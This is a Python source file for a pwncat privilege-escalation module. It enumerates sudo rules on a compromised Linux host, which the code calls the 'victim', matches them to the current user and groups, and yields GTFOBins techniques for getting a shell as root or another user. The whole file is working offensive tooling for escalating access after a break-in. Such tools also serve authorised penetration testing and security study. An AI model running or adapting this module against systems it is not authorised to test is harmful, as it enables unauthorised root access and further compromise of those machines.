#!/usr/bin/env python3

import pwncat
from pwncat.gtfobins import Capability, Stream, BinaryNotFound
from pwncat.modules.escalate import (
    EscalateModule,
    EscalateError,
    GTFOTechnique,
    Technique,
)


class Module(EscalateModule):
    """
    Utilize binaries with SUDO permissions to escalate to a different user.
    This module uses the GTFOBins library to generically locate
    payloads for binaries with excessive permissions.
    """

    PLATFORM = [pwncat.platform.linux.Linux]

    def enumerate(self):
        """ Enumerate SUDO permissions """
        rules = []
        for fact in pwncat.modules.run(
            "enumerate.software.sudo.rules", progress=self.progress
        ):

            # Doesn't appear to be a user specification
            if not fact.data.matched:
                continue

            # This specifies a user that is not us
            if (
                fact.data.user != "ALL"
                and fact.data.user != pwncat.victim.current_user.name
                and fact.data.group is None
            ):
                continue

            # Check if we are part of the specified group
            if fact.data.group is not None:
                for group in pwncat.victim.current_user.groups:
                    if fact.data.group == group.name:
                        break
                else:
                    # Non of our secondary groups match, was our primary group specified?
                    if fact.data.group != pwncat.victim.current_user.group.name:
                        continue

            # The rule appears to match, add it to the list
            rules.append(fact.data)

        for rule in rules:
            for command in rule.commands:
                for method in pwncat.victim.gtfo.iter_sudo(
                    command, caps=Capability.SHELL
                ):
                    user = "root" if rule.runas_user == "ALL" else rule.runas_user
                    yield GTFOTechnique(user, self, method, user=user, spec=command)

    def human_name(self, tech: "Technique"):
        return f"[cyan]{tech.method.binary_path}[/cyan] ([red]sudo[/red])"
